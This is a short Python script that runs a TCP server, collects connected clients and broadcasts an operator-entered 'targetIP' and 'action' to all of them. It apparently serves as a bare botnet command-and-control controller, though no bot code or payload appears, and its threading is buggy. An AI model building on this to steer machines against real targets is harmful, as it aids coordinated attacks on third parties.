import socket
import threading

IP = '0.0.0.0'
PORT = 8080

ClientList = []

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*] Listening on {IP}:{PORT}')

    while True:
        client, address = server.accept()
        ClientList.append(client)
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        client_handler = threading.Thread(target=handle_client, args=(ClientList,))
        client_handler.start()

def handle_client(ClientList):
    while True :
        targetIP = input("Enter targetIP : ")
        action = input("Enter action : ")
        message = targetIP + " " + action
        for client in ClientList :
            client.send(message.encode())

main()